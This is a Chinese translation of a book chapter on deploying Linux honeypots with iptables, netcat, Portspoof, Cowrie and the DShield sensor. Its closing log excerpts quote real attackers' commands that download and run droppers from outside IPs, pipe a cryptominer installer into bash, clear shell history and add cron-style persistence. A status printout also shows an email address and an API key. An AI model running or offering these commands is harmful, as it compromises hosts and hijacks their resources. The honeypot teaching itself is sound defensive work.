# 面向网络专家的 Linux（五）

> 原文：[`zh.annas-archive.org/md5/A72D356176254C9EA0055EAB3A38778D`](https://zh.annas-archive.org/md5/A72D356176254C9EA0055EAB3A38778D)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十四章：Linux 上的蜜罐服务

在本章中，我们将讨论蜜罐 - 您可以部署以收集攻击者活动的虚假服务，其误报率几乎为零。我们将讨论各种架构和放置选项，以及部署蜜罐的风险。还将讨论几种不同的蜜罐架构。本章应该让您开始实施各种网络上的“欺骗”方法，以分散和延迟攻击者，并提供几乎没有误报的攻击者活动的高保真日志。

在本章中，我们将讨论以下主题：

+   蜜罐概述 - 什么是蜜罐，我为什么要一个？

+   部署方案和架构 - 我应该把蜜罐放在哪里？

+   部署蜜罐的风险

+   示例蜜罐

+   分布/社区蜜罐 - 互联网风暴中心的 DShield 蜜罐项目

# 技术要求

本章讨论的所有蜜罐选项都可以直接部署在本书中一直使用的示例 Linux 主机上，或者在该主机 VM 的副本上。来自互联网风暴中心的最终示例蜜罐可能是您选择放在不同的专用主机上的蜜罐。特别是，如果您计划将此服务放在互联网上，我建议您选择一个可以随时删除的专用主机。

# 蜜罐概述 - 什么是蜜罐，我为什么要一个？

蜜罐服务器本质上是一个假服务器 - 一种呈现为*真实*服务器的东西，但除了记录和警报任何连接活动之外，没有任何数据或功能。

为什么您想要这样的东西？还记得[*第十三章*]（B16336_13_Final_NM_ePub.xhtml#_idTextAnchor236）中的*Linux 上的入侵防范系统*，当我们处理误报警报时吗？这些警报报告了一次攻击，但实际上是由正常活动触发的。嗯，蜜罐通常只发送您可以称之为“高保真”警报。如果蜜罐触发了，要么是因为真正的攻击者行为，要么是配置错误。

例如，您可能在服务器的 VLAN 中设置了一个蜜罐 SQL 服务器。该服务器将在端口`1433/tcp`（SQL）上进行监听，可能还会在端口`3389/tcp`（远程桌面）上进行监听。由于它不是一个真正的 SQL 服务器，它不应该（绝对不应该）在任何一个端口上看到连接。如果它确实看到了连接，要么是有人在网络上进行了不应该进行的探测，要么是一个有效的攻击。顺便说一句 - 渗透测试几乎总是会很快触发蜜罐，因为它们会扫描各种子网以寻找常见服务。

也就是说，在许多攻击中，您只有很短的时间来隔离和驱逐攻击者，以免造成不可挽回的损害。蜜罐能帮上忙吗？简短的答案是肯定的。蜜罐有几种形式：

![](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_Table_01.jpg)

这些情景通常适用于内部蜜罐和已经在您网络上的攻击者。在这些情况下，攻击者已经侵入了您网络上的一个或多个主机，并试图向更有价值的主机和服务（以及数据）“攀升”。在这些情况下，您对攻击者的平台有一定程度的控制 - 如果是一个受损的主机，您可以将其脱机并重建，或者如果是攻击者的物理主机（例如在无线网络受损后），您可以将其踢出网络并修复其访问方法。

另一个完全不同的场景是用于研究。例如，您可以在公共互联网上放置一个蜜罐 Web 服务器，以监视各种攻击的趋势。这些趋势通常是安全社区的第一个指标，表明存在新的漏洞 - 我们将看到攻击者试图利用特定平台上的 Web 服务漏洞，这是我们以前从未见过的。或者您可能会看到针对 Web 或 SSH 服务器的身份验证服务的攻击，使用新帐户，这可能表明出现了新的恶意软件或者可能是某个新服务遭受了涉及其订户凭据的违规行为。因此，在这种情况下，我们不是在保护我们的网络，而是在监视可以用来保护每个人网络的新的敌对活动。

蜜罐并不仅限于网络服务。越来越常见的是以相同的方式使用数据和凭据。例如，您可能有一些具有“吸引人”名称的文件，当它们被打开时会触发警报 - 这可能表明您有内部攻击者（当然要记录 IP 地址和用户 ID）。或者您可能在系统中有“虚拟”帐户，如果尝试访问它们，则会触发警报 - 这些可能再次用于发现攻击者何时进入环境。或者您可能会对关键数据进行“水印”，以便如果它在您的环境之外被看到，您将知道您的组织已经遭到入侵。所有这些都利用了相同的思维方式 - 拥有一组高保真度的警报，当攻击者访问吸引人的服务器、帐户甚至吸引人的文件时触发。

现在您知道了什么是蜜罐服务器以及为什么您可能需要一个，让我们进一步探讨一下，在您的网络中您可能选择放置一个蜜罐。

# 部署场景和架构 - 我应该把蜜罐放在哪里？

在内部网络上使用蜜罐的一个很好的用途是简单地监视常常受到攻击的端口的连接请求。在典型组织的内部网络中，攻击者可能会在他们的第一组“让我们探索网络”的扫描中扫描一小部分端口。如果您看到对不正当托管该服务的服务器的任何这些连接请求，那就是一个非常高保真度的警报！这几乎可以肯定地表明存在恶意活动！

你可能要观察哪些端口？一个合理的起始列表可能包括：

![](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_Table_03.jpg)

当然，列表还在继续 - 非常常见的是根据您的环境中实际运行的服务来定制您的蜜罐服务。例如，制造工厂或公用事业设施可能会建立伪装为**监控和数据采集**（**SCADA**）或**工业控制系统**（**ICS**）服务的蜜罐。

从我们的列表中，如果您试图向攻击者模拟 SQL 服务器，您可能会让您的蜜罐监听 TCP 端口`445`和`1433`。您不希望监听太多端口。例如，如果您的服务器监听了上表中的所有端口，那么这立即向您的攻击者传达了“这是一个蜜罐”的信息，因为这些端口几乎不会同时出现在单个生产主机上。这也告诉您的攻击者修改他们的攻击方式，因为现在他们知道您有蜜罐，并且可能正在监视蜜罐活动。

那么，我们应该把蜜罐放在哪里？过去，拥有蜜罐服务器更多是系统管理员对安全感兴趣的“运动”，他们会在互联网上放置 SSH 蜜罐，只是为了看看人们会做什么。这些日子已经过去了，现在直接放在互联网上的任何东西都会每天 - 或每小时或每分钟，取决于他们是什么类型的组织以及提供了什么服务 - 见到几次攻击。

在现代网络中我们在哪里看到蜜罐？您可能会在 DMZ 中放置一个。

![图 14.1 – 在 DMZ 中的蜜罐](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_001.jpg)

图 14.1 - DMZ 中的蜜罐

然而，这只是简单地检测互联网攻击，其用处有限 - 互联网攻击几乎是持续不断的，正如我们在[*第十三章*]（B16336_13_Final_NM_ePub.xhtml#_idTextAnchor236）中讨论的那样，*Linux 上的入侵防范系统*。更常见的是，我们会在内部子网上看到蜜罐：

![图 14.2 - 内部网络中的蜜罐](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_002.jpg)

图 14.2 - 内部网络中的蜜罐

这种方法是几乎 100%准确地检测内部攻击的好方法。您在临时或定期基础上进行的任何内部扫描当然都会被检测到，但除此之外，这些蜜罐的所有检测应该都是合法的攻击，或者至少值得调查的活动。

公共互联网上的研究蜜罐允许收集各种攻击趋势。此外，这些通常还允许您将您的攻击概况与综合攻击数据进行比较。

![图 14.3 - 公共互联网上的“研究”蜜罐](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_003.jpg)

图 14.3 - 公共互联网上的“研究”蜜罐

现在我们已经了解了部署各种类型的蜜罐所涉及的各种架构，以及为什么我们可能希望或需要其中之一，那么在部署这些类型的“欺骗主机”时涉及哪些风险呢？

# 部署蜜罐的风险

众所周知，蜜罐的作用是检测攻击者，因此很可能会看到它们被成功攻击和 compromise。特别是最后一个例子，您将服务暴露给互联网是一个相当冒险的游戏。如果攻击者成功攻击了您的蜜罐，他们不仅可以在您的网络中立足，而且现在可以控制该蜜罐发送的警报，而您很可能依赖这些警报来检测攻击。也就是说，明智的做法是始终计划妥协，并随时准备好应对措施：

+   如果您的蜜罐面向公共互联网，请将其放置在 DMZ 中，以确保该段对您其他生产主机没有访问权限。

+   如果您的蜜罐位于内部网络中，您可能仍希望将其放置在 DMZ 中，并进行 NAT 条目，使其看起来像是在内部网络中。或者，**私有 VLAN**（PVLAN）也可以很好地适用于此位置。

+   只允许蜜罐服务所需的出站活动。

+   对蜜罐进行镜像，以便如果需要从头开始恢复它，您是从已知的良好镜像中进行恢复，而不是从头重新安装 Linux 等。利用虚拟化在这里可以帮助很大 - 恢复蜜罐服务器应该只需要几分钟或几秒钟。

+   将所有蜜罐活动记录到一个中央位置。随着时间的推移，您可能会发现您可能会在各种情况下部署多个蜜罐。中央日志记录允许您配置中央警报，所有这些都是您的攻击者可能最终会妥协的主机。有关中央日志记录的方法和保护这些日志服务器，请参阅[*第十二章*]（B16336_12_Final_NM_ePub.xhtml#_idTextAnchor216），*使用 Linux 进行网络监控*。

+   定期轮换蜜罐镜像 - 除了本地日志之外，蜜罐本身不应该有任何长期的值得注意的数据，因此如果您有良好的主机恢复机制，自动定期重新映像您的蜜罐是明智的选择。

在考虑架构和这个警告的基础上，让我们讨论一些常见的蜜罐类型，从基本的端口警报方法开始。

# 示例蜜罐

在本节中，我们将讨论构建和部署各种蜜罐解决方案。我们将介绍如何构建它们，您可能希望将它们放置在何处以及原因。我们将重点讨论以下内容：

+   基本的“TCP 端口”蜜罐，我们会对攻击者的端口扫描和对我们各种服务的连接尝试进行警报。我们将讨论这些警报，没有开放端口（因此攻击者不知道他们触发了警报），以及作为实际开放端口服务，这将减慢攻击者的速度。

+   预先构建的蜜罐应用程序，包括开源和商业应用。

+   互联网风暴中心的 DShield 蜜罐，既分布式又基于互联网。

让我们开始吧，首先尝试几种不同的方法来建立“开放端口”蜜罐主机。

## 基本的端口警报蜜罐-iptables、netcat 和 portspoof

在 Linux 中，基本的端口连接请求很容易捕捉到，甚至不需要一个监听端口！因此，不仅可以在内部网络上捕捉到恶意主机，而且它们根本看不到任何开放的端口，因此无法得知你已经“拍摄”了它们。

为了做到这一点，我们将使用`iptables`来监视任何给定端口的连接请求，然后在发生时记录它们。这个命令将监视对端口`8888/tcp`的连接请求（`SYN`数据包）：

```
$ sudo iptables -I INPUT -p tcp -m tcp --dport 8888 -m state --state NEW  -j LOG --log-level 1 --log-prefix "HONEYPOT - ALERT PORT 8888"
```

我们可以很容易地使用`nmap`（从远程机器）来测试这一点-请注意端口实际上是关闭的：

```
$ nmap -Pn -p8888 192.168.122.113
Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-09 10:29 Eastern Daylight Time
Nmap scan report for 192.168.122.113
Host is up (0.00013s latency).
PORT     STATE  SERVICE
8888/tcp closed sun-answerbook
MAC Address: 00:0C:29:33:2D:05 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 5.06 seconds
```

现在我们可以检查日志：

```
$ cat /var/log/syslog | grep HONEYPOT
Jul  9 10:29:49 ubuntu kernel: [  112.839773] HONEYPOT - ALERT PORT 8888IN=ens33 OUT= MAC=00:0c:29:33:2d:05:3c:52:82:15:52:1b:08:00 SRC=192.168.122.201 DST=192.168.122.113 LEN=44 TOS=0x00 PREC=0x00 TTL=41 ID=42659 PROTO=TCP SPT=44764 DPT=8888 WINDOW=1024 RES=0x00 SYN URGP=0
robv@ubuntu:~$ cat /var/log/kern.log | grep HONEYPOT
Jul  9 10:29:49 ubuntu kernel: [  112.839773] HONEYPOT - ALERT PORT 8888IN=ens33 OUT= MAC=00:0c:29:33:2d:05:3c:52:82:15:52:1b:08:00 SRC=192.168.122.201 DST=192.168.122.113 LEN=44 TOS=0x00 PREC=0x00 TTL=41 ID=42659 PROTO=TCP SPT=44764 DPT=8888 WINDOW=1024 RES=0x00 SYN URGP=0
```

参考*第十二章*，*使用 Linux 进行网络监控*，从这里开始很容易记录到远程 syslog 服务器并对任何出现`HONEYPOT`一词的情况进行警报。我们可以扩展这个模型，包括任意数量的有趣端口。

如果你想要打开端口并进行警报，你可以使用`netcat`来做到这一点-甚至可以通过添加横幅来“装饰”它：

```
#!/bin/bash
PORT=$1
i=1
HPD='/root/hport'
if [ ! -f $HPD/$PORT.txt ]; then
    echo $PORT >> $HPD/$PORT.txt
fi
BANNER='cat $HPD/$PORT.txt'
while true;
    do
    echo "................................." >> $HPD/$PORT.log;
    echo -e $BANNER | nc -l $PORT -n -v 1>> $HPD/$PORT.log 2>> $HPD/$PORT.log;
    echo "Connection attempt - Port: $PORT at" 'date';
    echo "Port Connect at:" 'date' >> $HPD/$PORT.log;
done
```

因为我们正在监听任意端口，所以你需要以 root 权限运行这个脚本。还要注意，如果你想要一个特定的横幅（例如，端口`3389/tcp`的 RDP 或`1494/tcp`的 ICA），你需要创建这些横幅文件，命令如下：

```
echo RDP > 3389.txt
The output as your attacker connects will look like:
# /bin/bash ./hport.sh 1433
Connection attempt - Port: 1433 at Thu 15 Jul 2021 03:04:32 PM EDT
Connection attempt - Port: 1433 at Thu 15 Jul 2021 03:04:37 PM EDT
Connection attempt - Port: 1433 at Thu 15 Jul 2021 03:04:42 PM EDT
```

日志文件将如下所示：

```
$ cat 1433.log
.................................
Listening on 0.0.0.0 1433
.................................
Listening on 0.0.0.0 1433
Connection received on 192.168.122.183 11375
Port Connect at: Thu 15 Jul 2021 03:04:32 PM EDT
.................................
Listening on 0.0.0.0 1433
Connection received on 192.168.122.183 11394
Port Connect at: Thu 15 Jul 2021 03:04:37 PM EDT
.................................
Listening on 0.0.0.0 1433
Connection received on 192.168.122.183 11411
Port Connect at: Thu 15 Jul 2021 03:04:42 PM EDT
.................................
Listening on 0.0.0.0 1433
```

更好的方法是使用一个由某人维护的实际软件包，可以监听多个端口。你可以在 Python 中快速编写监听特定端口的代码，然后为每个连接记录一个警报。或者你可以利用其他人已经完成的工作，也已经进行了调试，这样你就不必自己动手了！

Portspoof 就是这样一个应用程序-你可以在[`github.com/drk1wi/portspoof`](https://github.com/drk1wi/portspoof)找到它。

Portspoof 使用的是“老派”Linux 安装；也就是说，将你的目录更改为`portspoof`下载目录，然后按顺序执行以下命令：

```
# git clone  https://github.com/drk1wi/portspoof
# cd portspoof
# Sudo ./configure
# Sudo Make
# Sudo Make install
```

这将把 Portspoof 安装到`/usr/local/bin`，配置文件在`/usr/local/etc`。

查看`/usr/local/etc/portspoof.conf`，使用`more`或`less`-你会发现它有很好的注释，并且很容易修改以满足你的需求。

默认情况下，这个工具在安装后立即可以使用。首先，我们将使用`iptables`重定向我们想要监听的所有端口，并将它们指向`4444/tcp`端口，这是`portspoof`的默认端口。请注意，你需要`sudo`权限来执行这个`iptables`命令：

```
# iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80:90 -j REDIRECT --to-ports 4444
```

接下来，只需运行`portspoof`，使用默认的签名和配置：

```
$ portspoof -v -l /some/path/portspoof.log –c /usr/local/etc/portspoof.conf –s /usr/local/etc/portspoof_signatures
```

现在我们将扫描一些重定向的端口，一些是重定向的，一些不是-请注意我们正在使用`banner.nse`收集服务“横幅”，而`portspoof`已经为我们预先配置了一些横幅。

```
nmap -sT -p 78-82 192.168.122.113 --script banner
Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-15 15:44 Eastern Daylight Time
Nmap scan report for 192.168.122.113
Host is up (0.00020s latency).
PORT   STATE    SERVICE
78/tcp filtered vettcp
79/tcp filtered finger
80/tcp open     http
| banner: HTTP/1.0 200 OK\x0D\x0AServer: Apache/IBM_Lotus_Domino_v.6.5.1\
|_x0D\x0A\x0D\x0A--<html>\x0D\x0A--<body><a href="user-UserID">\x0D\x0...
81/tcp open     hosts2-ns
| banner: <pre>\x0D\x0AIP Address: 08164412\x0D\x0AMAC Address: \x0D\x0AS
|_erver Time: o\x0D\x0AAuth result: Invalid user.\x0D\x0A</pre>
82/tcp open     xfer
| banner: HTTP/1.0 207 s\x0D\x0ADate: r\x0D\x0AServer: FreeBrowser/146987
|_099 (Win32)
MAC Address: 00:0C:29:33:2D:05 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```

回到`portspoof`屏幕，我们会看到以下内容：

```
$ portspoof -l ps.log -c ./portspoof.conf  -s ./portspoof_signatures
-> Using log file ps.log
-> Using user defined configuration file ./portspoof.conf
-> Using user defined signature file ./portspoof_signatures
Send to socket failed: Connection reset by peer
Send to socket failed: Connection reset by peer
Send to socket failed: Connection reset by peer
The logfile looks like this:
$ cat /some/path/ps.log
1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:80
1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:82
1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:81
```

你也可以从 syslog 中获取`portspoof`的条目。信息是一样的，但时间戳是以 ASCII 格式而不是“自纪元开始以来的秒数”格式：

```
$ cat /var/log/syslog | grep portspoof
Jul 15 15:48:02 ubuntu portspoof[26214]:  1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:80
Jul 15 15:48:02 ubuntu portspoof[26214]:  1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:82
Jul 15 15:48:02 ubuntu portspoof[26214]:  1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:81
```

最后，如果是时候关闭`portspoof`，你需要删除我们放入的 NAT 条目，将你的 Linux 主机恢复到对这些端口的原始处理方式。

```
$ sudo iptables -t nat -F
```

但是，如果我们想要更复杂的东西呢？我们当然可以使我们自己构建的蜜罐变得越来越复杂和逼真，以欺骗攻击者，或者我们可以购买更完整的产品，提供完整的报告和支持。

## 其他常见的蜜罐

在公共方面，您可以使用**Cowrie** ([`github.com/cowrie/cowrie`](https://github.com/cowrie/cowrie))，这是由*Michel Oosterhof*维护的 SSH 蜜罐。这可以配置成像一个真实的主机 - 当然，游戏的目标是浪费攻击者的时间，以便让您有时间将他们从您的网络中驱逐出去。在这个过程中，您可以了解到他们的技能水平，并且通常可以得知他们在攻击中实际试图达到的目标。

**WebLabyrinth** ([`github.com/mayhemiclabs/weblabyrinth`](https://github.com/mayhemiclabs/weblabyrinth)) 由*Ben Jackson*提供了一个永无止境的网页系列，用作 Web 扫描器的“粘陷”。再次强调目标是一样的 - 浪费攻击者的时间，并在攻击过程中尽可能多地获取有关他们的情报。

**Thinkst Canary** ([`canary.tools/`](https://canary.tools/) and [`thinkst.com/`](https://thinkst.com/)) 是一种商业解决方案，在提供的细节和完整性方面非常彻底。事实上，该产品的详细程度允许您建立一个完整的“诱饵数据中心”或“诱饵工厂”。它不仅可以让您愚弄攻击者，而且往往欺骗到了他们认为他们实际上正在通过生产环境进行进展的程度。

让我们离开内部网络和相关的内部和 DMZ 蜜罐，看看面向研究的蜜罐。

# 分布/社区蜜罐 - 互联网风暴中心的 DShield 蜜罐项目

首先，从您的主机获取当前日期和时间。任何严重依赖日志的活动都需要准确的时间：

```
# date
Fri 16 Jul 2021 03:00:38 PM EDT
```

如果您的日期/时间不准确或配置不可靠，您将希望在开始之前修复它 - 这对于任何操作系统中的任何服务都是真实的。

现在，切换到一个安装目录，然后使用`git`下载应用程序。如果您没有`git`，请使用本书中一直使用的标准`sudo apt-get install git`来获取它。一旦安装了`git`，这个命令将在当前工作目录下创建一个`dshield`目录：

```
git clone https://github.com/DShield-ISC/dshield.git
```

接下来，运行`install`脚本：

```
cd dshield/bin
sudo ./install.sh
```

在这个过程中，会有几个输入屏幕。我们将在这里介绍一些关键的屏幕：

1.  首先，我们有一个标准警告，即蜜罐日志当然会包含敏感信息，既来自您的环境，也来自攻击者！[](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_004.jpg)

图 14.4 - 关于敏感信息的警告

1.  下一个安装屏幕似乎表明这是在 Raspberry Pi 平台上安装。不用担心，虽然这是这个防火墙的一个非常常见的平台，但它也可以安装在大多数常见的 Linux 发行版上。![图 14.5 - 关于安装和支持的第二个警告](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_005.jpg)

图 14.5 - 关于安装和支持的第二个警告

1.  接下来，我们得到另一个警告，表明您收集的数据将成为互联网风暴中心的 DShield 项目的一部分。当它被合并到更大的数据集中时，您的数据会被匿名化，但如果您的组织没有准备好共享安全数据，那么这种类型的项目可能不适合您：![图 14.6 - 关于数据共享的第三次安装警告](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_006.jpg)

图 14.6 - 关于数据共享的第三次安装警告

1.  您将被问及是否要启用自动更新。这里的默认设置是启用这些更新 - 只有在您有一个非常好的理由时才禁用它们。![图 14.7 - 更新的安装选择](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_007.jpg)

图 14.7 - 更新的安装选择

1.  您将被要求输入您的电子邮件地址和 API 密钥。这用于数据提交过程。您可以通过登录[`isc.sans.edu`](https://isc.sans.edu)网站并查看您的账户状态来获取 API 密钥：图 14.8 - 上传数据的凭据输入

图 14.8 - 上传数据的凭据输入

1.  您还将被问及您希望蜜罐监听哪个接口。在这些情况下，通常只有一个接口 - 您绝对不希望您的蜜罐绕过防火墙控制！图 14.9 - 接口选择

图 14.9 - 接口选择

1.  您将被要求输入 HTTPS 蜜罐的证书信息 - 如果您希望您的传感器对攻击者来说有些匿名性，您可能会选择在这些字段中输入虚假信息。在这个例子中，我们展示了大部分合法的信息。请注意，此时 HTTPS 蜜罐尚未实施，但正在规划阶段。图 14.10 - 证书信息

。

图 14.10 - 证书信息

1.  您将被问及是否要安装**证书颁发机构**（**CA**）。在大多数情况下，在这里选择**是**是有意义的 - 这将在 HTTPS 服务上安装自签名证书。图 14.11 - 是否需要 CA？

图 14.11 - 是否需要 CA？

1.  最终屏幕重新启动主机，并通知您实际的 SSH 服务将更改到不同的端口。

图 14.12 - 最终安装屏幕

图 14.12 - 最终安装屏幕

重启后，检查蜜罐的状态。请注意，传感器安装在`/srv/dshield`中：

```
$ sudo /srv/dshield/status.sh
[sudo] password for hp01:
#########
###
### DShield Sensor Configuration and Status Summary
###
#########
Current Time/Date: 2021-07-16 15:27:00
API Key configuration ok
Your software is up to date.
Honeypot Version: 87
###### Configuration Summary ######
E-mail : rob@coherentsecurity.com
API Key: 4BVqN8vIEDjWxZUMziiqfQ==
User-ID: 948537238
My Internal IP: 192.168.122.169
My External IP: 99.254.226.217
###### Are My Reports Received? ######
Last 404/Web Logs Received:
Last SSH/Telnet Log Received:
Last Firewall Log Received: 2014-03-05 05:35:02
###### Are the submit scripts running?
Looks like you have not run the firewall log submit script yet.
###### Checking various files
OK: /var/log/dshield.log
OK: /etc/cron.d/dshield
OK: /etc/dshield.ini
OK: /srv/cowrie/cowrie.cfg
OK: /etc/rsyslog.d/dshield.conf
OK: firewall rules
ERROR: webserver not exposed. check network firewall
```

此外，为了确保您的报告已提交，一两个小时后请检查[`isc.sans.edu/myreports.html`](https://isc.sans.edu/myreports.html)（您需要登录）。

状态检查中显示的错误是此主机尚未连接到互联网 - 这将是我们的下一步。在我的情况下，我将把它放在一个 DMZ 中，只允许对端口`22/tcp`，`80/tcp`和`443/tcp`进行入站访问。做出这些更改后，我们的状态检查现在通过了：

```
###### Checking various files
OK: /var/log/dshield.log
OK: /etc/cron.d/dshield
OK: /etc/dshield.ini
OK: /srv/cowrie/cowrie.cfg
OK: /etc/rsyslog.d/dshield.conf
OK: firewall rules
OK: webserver exposed
```

当浏览器指向蜜罐的地址时，他们将看到这个：

图 14.13 - 从浏览器中看到的 ISC 网络蜜罐

图 14.13 - 从浏览器中看到的 ISC 网络蜜罐

在蜜罐服务器本身上，您可以看到各种登录会话，攻击者可以访问假的 SSH 和 Telnet 服务器。在`/srv/cowrie/var/log/cowrie`中，文件是`cowrie.json`和`cowrie.log`（以及以前几天的日期版本）：

```
$ pwd
/srv/cowrie/var/log/cowrie
$ ls
cowrie.json             cowrie.json.2021-07-18  cowrie.log.2021-07-17
cowrie.json.2021-07-16  cowrie.log              cowrie.log.2021-07-18
cowrie.json.2021-07-17  cowrie.log.2021-07-16
```

当然，`JSON`文件是为您编写代码而格式化的。例如，Python 脚本可能会获取这些信息并将其提供给 SIEM 或其他"下一阶段"的防御工具。

然而，文本文件很容易阅读 - 您可以使用`more`或`less`（Linux 中常见的两个文本查看应用程序）打开它。让我们看一些有趣的日志条目。

以下代码块显示了启动新会话 - 请注意日志条目中的协议和源 IP。在 SSH 会话中，您还将在日志中看到各种 SSH 加密参数：

```
2021-07-19T00:04:26.774752Z [cowrie.telnet.factory.HoneyPotTelnetFactory] New co
nnection: 27.213.102.95:40579 (192.168.126.20:2223) [session: 3077d7bc231f]
2021-07-19T04:04:20.916128Z [cowrie.telnet.factory.HoneyPotTelnetFactory] New co
nnection: 116.30.7.45:36673 (192.168.126.20:2223) [session: 18b3361c21c2]
2021-07-19T04:20:01.652509Z [cowrie.ssh.factory.CowrieSSHFactory] New connection
: 103.203.177.10:62236 (192.168.126.20:2222) [session: 5435625fd3c2]
```

我们还可以查找各种攻击者尝试运行的命令。在这些示例中，他们试图下载额外的 Linux 工具，因为蜜罐似乎缺少一些工具，或者可能是一些恶意软件以持续运行：

```
2021-07-19T02:31:55.443537Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,5,141.98.10.56] Command found: wget http://142.93.105.28/a
2021-07-17T11:44:11.929645Z [CowrieTelnetTransport,4,58.253.13.80] CMD: cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://58.253.13.80:60232/i; curl -O http://58.253.13.80:60232/i; /bin/busybox wget http://58.253.13.80:60232/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
2021-07-18T07:12:02.082679Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,33,209.141.53.60] executing command "b'cd /tmp || cd
 /var/run || cd /mnt || cd /root || cd /; wget http://205.185.126.121/8UsA.sh; curl -O http://205.185.126.121/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 205.185.126.121 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 205.185.126.121; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p
anonymous -P 21 205.185.126.121 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *'"
```

请注意，第一个攻击者在最后发送了一个 ASCII 字符串，以十六进制表示为`'\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'`，这意味着"connected"。这可能是为了规避入侵防御系统。Base64 编码是另一种常见的规避技术，在蜜罐日志中也会看到。

第二个攻击者有一系列`rm`命令，用于在完成目标后清理他们的各种工作文件。

请注意，您在 SSH 日志中可能会看到的另一件事是语法错误。通常这些错误来自未经充分测试的脚本，但一旦会话更频繁地建立，您将看到真正的人在键盘上操作，因此您将从任何错误中得到一些关于他们的技能水平（或者他们所在时区的深夜程度）的指示。

在接下来的例子中，攻击者试图下载加密货币挖矿应用程序，将他们新受损的 Linux 主机添加到他们的加密货币挖矿“农场”中：

```
2021-07-19T02:31:55.439658Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,5,141.98.10.56] executing command "b'curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7 bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; wget http://142.93.105.28/a; chmod 777 a; ./a; rm -rfa ; history -c'"
2021-07-19T04:28:49.356339Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,9,142.93.97.193] executing command "b'curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7 bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; wget http://142.93.105.28/a; chmod 777 a; ./a; rm -rfa; history -c'"
```

请注意，他们都在他们的命令中添加了一个`history –c`附录，用于清除当前会话的交互式历史记录，以隐藏攻击者的活动。

在这个例子中，攻击者试图将恶意软件下载添加到 Linux 调度程序 cron 中，以便他们可以保持持久性 - 如果他们的恶意软件被终止或删除，它将在下一个计划任务到来时重新下载并重新安装：

```
2021-07-19T04:20:03.262591Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,103.203.177.10] executing command "b'/system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://bestony.club/poll/24eff58f-9d8a-43ae-96de-71c95d9e6805 mode=http dst-path=7wmp0b4s.rsc\\r\\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write'"
```

攻击者试图下载的各种文件都被收集在`/srv/cowrie/var/lib/cowrie/downloads`目录中。

您可以自定义 Cowrie 诱饵 - 您可能会进行的一些常见更改位于以下位置：

![](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_Table_04.jpg)

还有什么？只需在线检查您的 ISC 账户 - 您可能会感兴趣的链接位于**我的账户**下：

![图 14.14 – ISC 诱饵 – 在线报告](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_014.jpg)

图 14.14 – ISC 诱饵 – 在线报告

让我们稍微详细讨论一下这些选项：

![](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_Table_05.jpg)

在线，针对您的诱饵的 SSH 活动在 ISC 门户网站下的**我的 SSH 报告**中进行了总结：

![图 14.15 – SSH 诱饵报告](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/linux-net-prof/img/B16336_14_015.jpg)

图 14.15 – SSH 诱饵报告

目前，SSH 汇总数据的主要报告涉及使用的用户 ID 和密码：

